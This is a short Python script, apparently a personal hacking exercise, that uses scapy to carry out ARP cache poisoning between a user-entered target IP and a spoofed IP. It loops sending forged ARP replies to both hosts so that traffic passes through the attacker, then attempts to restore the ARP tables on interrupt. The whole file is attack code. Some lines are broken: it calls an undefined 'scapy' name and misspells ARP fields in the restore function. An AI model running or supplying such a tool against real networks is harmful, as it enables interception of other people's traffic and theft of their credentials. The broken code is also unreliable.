'''
Created on 13 Apr 2021

@author: Adam
'''
#!/usr/bin/python3


#from scapy.layers.l2 import ARP, Ether
from scapy.all import *
#import scapy.all as scapy

def restore(destination_ip, source_ip):
    target_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(ops=2, pdst=destination_ip, hwdst=target_mac,sdst=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)
    
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast/arp_request
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return(mac)
    
def spoof_arp(target_ip, spoofed_ip):
    mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)
    

def main():
    target_ip = input("[*] Enter target ip: ")
    spoofed_ip = input('Enter spoof ip: ')

    try:
        while True:
            spoof_arp(spoofed_ip, target_ip)
            spoof_arp(target_ip, spoofed_ip)
             
    except KeyboardInterrupt:
        restore(target_ip, spoofed_ip)
        restore(spoofed_ip,target_ip)
        exit(0)

main()